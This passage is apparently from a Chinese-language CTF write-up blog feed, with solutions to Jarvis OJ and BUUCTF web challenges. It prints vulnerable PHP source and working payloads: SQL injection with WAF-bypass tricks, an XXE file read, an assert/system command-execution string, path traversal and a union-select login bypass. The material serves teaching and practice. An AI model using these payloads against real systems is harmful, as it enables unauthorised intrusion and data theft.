&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;error_reporting(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;!--index.phps--&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;])&lt;br&gt;&amp;#123;&lt;br&gt;	header(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Location: index.php?id=1&amp;#x27;&lt;/span&gt;);&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;();&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$id&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;=&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(stripos(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;))&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Hahahahahaha&amp;#x27;&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; ;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt; = @file_get_contents(&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$data&lt;/span&gt;==&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1112 is a nice lab!&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$id&lt;/span&gt;==&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; strlen(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;)&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; eregi(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;111&amp;quot;&lt;/span&gt;.substr(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;),&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1114&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; substr(&lt;span class=&#34;hljs-variable&#34;&gt;$b&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)!=&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;)&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;require&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.txt&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&lt;br&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;work harder!harder!harder!&amp;quot;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到主要就是那一层 if&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;$data 用 php://input 传进去&lt;/li&gt;
&lt;li&gt;id=0&lt;/li&gt;
&lt;li&gt;b 长度要大于 5 但是要满足第二、三层要长度为 0，这时候就要让 b=%0011111，strlen 不会被截断，substr 会被截断&lt;/li&gt;
&lt;li&gt;然后让我们访问 http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1，又看到了 id=1，有可能是注入&lt;/li&gt;
&lt;li&gt;用单引号测试发现直接返回了 sql 语句，那看来应该就是 sql 注入了&lt;/li&gt;
&lt;li&gt;测试发现过滤了空格这个可以用注释符 /**/ 绕过，但是发现直接用会被过滤，试着往里面加点东西就好了&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#&lt;/code&gt; 测试得到字段数为 3&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()/*1*/#&lt;/code&gt; 拿到数据库名是 test&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,table_name/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#&lt;/code&gt; 拿到表名 content&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74#&lt;/code&gt; 得到字段名是 id,context,title&lt;/li&gt;
&lt;li&gt;用 &lt;code&gt;http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content#&lt;/code&gt; 拿到 flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;api调用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#api调用&#34;&gt;#&lt;/a&gt; api 调用&lt;/h2&gt;
&lt;p&gt;由于默认传输是 json 格式，先抓包把格式改成 xml，然后传 payload`&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;&lt;/p&gt;
 &lt;!DOCTYPE foo [
 &lt;!ENTITY myentity SYSTEM &#34;file:///home/ctf/flag.txt&#34; &gt;]&gt;
&lt;p&gt;&lt;abc&gt;&amp;amp;myentity;&lt;/abc&gt;` 就拿到了 flag&lt;/p&gt;
&lt;h2 id=&#34;web-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web-2&#34;&gt;#&lt;/a&gt; WEB？&lt;/h2&gt;
&lt;p&gt;一开始还看不懂题目要干嘛，然后查看源代码看到一堆 Js，然后用谷歌插件美化一下（安利一下 JavaScript and CSS Code Beautifier），方便看代码。然后发现有两万行的代码。。。。看 WP 知道了用 password 关键词来开始审计。大概就是矩阵 A*B=C, 已知 B，C 求 A。（线代知识早就忘得差不多了）&lt;/p&gt;
&lt;h2 id=&#34;babyphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#babyphp&#34;&gt;#&lt;/a&gt; babyphp&lt;/h2&gt;
&lt;p&gt;攻防世界原题，先是 githack 拿到源码，然后 assert 任意代码执行拿到 flag，用’) 闭合然后任意执行代码&lt;br&gt;
 payload： &lt;code&gt;?page=2&#39;) or system(&amp;quot;cat templates/flag.php&amp;quot;);//&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;inject&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#inject&#34;&gt;#&lt;/a&gt; inject&lt;/h2&gt;
&lt;p&gt;提示说先拿到源码再说，看了 WP 知道要试常见的备份文件名，常见的备份文件临时文件名，比如.bak、.swp、.save、&lt;sub&gt;等，然后这一题是在 index.php&lt;/sub&gt;… 拿到源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;require&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;config.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;table&amp;#x27;&lt;/span&gt;]?&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;table&amp;#x27;&lt;/span&gt;]:&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;test&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt; = Filter(&lt;span class=&#34;hljs-variable&#34;&gt;$table&lt;/span&gt;);&lt;br&gt;mysqli_query(&lt;span class=&#34;hljs-variable&#34;&gt;$mysqli&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;desc `secret_&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;$table&amp;#125;&lt;/span&gt;`&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; Hacker();&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$sql&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;select &amp;#x27;flag&amp;#123;xxx&amp;#125;&amp;#x27; from secret_&lt;span class=&#34;hljs-subst&#34;&gt;&amp;#123;$table&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$ret&lt;/span&gt; = sql_query(&lt;span class=&#34;hljs-variable&#34;&gt;$sql&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$ret&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p luckyGame~=&#34;&#34;&gt;应该是 sql 注入的题目，先是要成功执行 desc  &lt;code&gt;secret_&amp;#123;$table&amp;#125;&lt;/code&gt; ，然后利用下面的 sql 语句拿到 flag。desc table_name 需要表存在，这样就限制了注入，因此应该就是要在这里下功夫。&lt;br&gt;
因为 desc  &lt;code&gt;test&lt;/code&gt;   &lt;code&gt;aaa&lt;/code&gt; , 只要第一个表存在就会执行，但是如果是单引号就不会执行，这一要考核的应该就是这个点。然后就可以构造 payload：&amp;quot;?table=test &lt;code&gt; &lt;/code&gt; union select database () limit 1,1&amp;quot; 拿到数据库名 61d300，注意要加 limit，不然直会返回 D。然后构造 payload：“?table=test &lt;code&gt; &lt;/code&gt; union select table_name from information_schema.tables where table_schema=0x363164333030 limit 1,1”，拿到表名 secret_flag，注意用十六进制过 waf。同样办法拿到列名 flagUwillNeverKnow，然后拿到 flag：flag&lt;/p&gt;
&lt;h2 id=&#34;phpinfo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#phpinfo&#34;&gt;#&lt;/a&gt; phpinfo&lt;/h2&gt;
&lt;p&gt;session 的序列化方法不同导致的漏洞，还有就是如何往 session 里加入 payload&lt;/p&gt;
&lt;h2 id=&#34;re&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#re&#34;&gt;#&lt;/a&gt; RE？&lt;/h2&gt;
&lt;p&gt;下载了个 udf.so 文件，不知道这是啥就上网搜了一下，&lt;a href=&#34;https://www.cnblogs.com/sijidou/p/10522972.html&#34;&gt;https://www.cnblogs.com/sijidou/p/10522972.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag在管理员手里&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flag在管理员手里&#34;&gt;#&lt;/a&gt; flag 在管理员手里&lt;/h2&gt;
&lt;p&gt;先抓个包，看到 cookie 里有一个 admin=0，改成 1 不行，还有一个字符串，url 解码以后发现是 s:5:“guest”; 试一下改成 admin 很显然也是不行的，还有就是一个哈希值，估计直接爆破也是不行的，到这里就断了思路。然后看 WP 说找源码，一样的 index.php~ 拿到一个实质为.swp 的 vim 异常退出文件，然后就分析一下源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;guest&amp;quot;&lt;/span&gt;;&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt; = &lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;])) &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;]);&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;hsh&amp;quot;&lt;/span&gt;];&lt;br&gt;	    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt;===&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; === md5(&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt;.strrev(&lt;span class=&#34;hljs-variable&#34;&gt;$_COOKIE&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;role&amp;quot;&lt;/span&gt;]))) &amp;#123;&lt;br&gt;	        &lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;&lt;br&gt;	    &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;	        &lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;	    &amp;#125;&lt;br&gt;	&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt; = serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$role&lt;/span&gt;);&lt;br&gt;	    setcookie(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;role&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;);&lt;br&gt;	    &lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt; = md5(&lt;span class=&#34;hljs-variable&#34;&gt;$salt&lt;/span&gt;.strrev(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;));&lt;br&gt;	    setcookie(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;hsh&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$hsh&lt;/span&gt;);&lt;br&gt;	&amp;#125;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$auth&lt;/span&gt;) &amp;#123;&lt;br&gt;	    &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;h3&amp;gt;Welcome Admin. Your flag is &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	    echo &amp;quot;&lt;/span&gt;&amp;lt;h3&amp;gt;Only Admin can see the flag!!&amp;lt;/h3&amp;gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p H45h_ext3ndeR_i5_easy_to_us3=&#34;&#34;&gt;可以看到哈希值是 md5 (salt + 反向 “admin”)；应该是哈希的某种攻击方法。了解到应该可以进行哈希长度拓展攻击。&lt;br&gt;
（参考 https://www.cnblogs.com/pcat/p/5478509.html）&lt;br&gt;
PCTF&lt;/p&gt;
&lt;h2 id=&#34;chopper&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chopper&#34;&gt;#&lt;/a&gt; Chopper&lt;/h2&gt;
&lt;p&gt;进入管理员登陆界面，查看源代码发现 “admin ip is 202.5.19.128”；&lt;/p&gt;
&lt;h2 id=&#34;simple-injection&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#simple-injection&#34;&gt;#&lt;/a&gt; Simple Injection&lt;/h2&gt;
&lt;p&gt;发现当输入的账号是 admin 的时候回显是密码错误，输入其他账户的时候回显是密码错误。当账户名用 admin’ #发现可以但是用 admin’ and 1=1 #时被过滤了，再试一下 &lt;code&gt;admin&#39;/**/and/**/&lt;/code&gt;  发现没有被过滤，也就是这里存在注入点，根据回显可以尝试 bool 盲注或者时间盲注。&lt;br&gt;
不过看了 WP 才发现还有一种更简单的方法&lt;br&gt;
直接用 payload &lt;code&gt;username=miracle778&#39;/**/union(select(md5(&#39;123&#39;)))#&amp;amp;password=123&lt;/code&gt;  就能拿到 flag&lt;/p&gt;
</content>
        <updated>2019-11-27T14:22:21.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/11/20/BUUCTF-WP/</id>
        <title>BUUCTF-WP</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/11/20/BUUCTF-WP/"/>
        <content type="html">&lt;p&gt;BUUCTF 部分题解&lt;br&gt;
 OJ 链接 https://buuoj.cn/challenges&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&#34;hctf-2018warmup&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hctf-2018warmup&#34;&gt;#&lt;/a&gt; [HCTF 2018]WarmUp&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;先查看网页源代码，发现 source.php，就读到了源码，然后还有一个 hint.php 可以看到 flag 在 ffffllllaaaagggg&lt;/li&gt;
&lt;li&gt;分析一下源码：&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight autoit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autoit&#34;&gt;$_page = mb_substr(&lt;br&gt;                $page,&lt;br&gt;                &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;br&gt;                mb_strpos($page . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;?&amp;#x27;&lt;/span&gt;)&lt;br&gt;            )&lt;span class=&#34;hljs-comment&#34;&gt;;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到它是根据？的位置来截取，因此可以构造 paylaod： &lt;code&gt;?file=hint.php?../../../../../../../ffffllllaaaagggg&lt;/code&gt;  就读到了 flag&lt;/p&gt;
&lt;h2 id=&#34;强网杯-2019随便注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#强网杯-2019随便注&#34;&gt;#&lt;/a&gt; [强网杯 2019] 随便注&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;先用单引号闭合，发现报错，然后用 order by 测试出字段数为 2，再尝试 union 注入发现过滤： &lt;code&gt;return preg_match(&amp;quot;/select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);&lt;/code&gt;&lt;/li&gt;
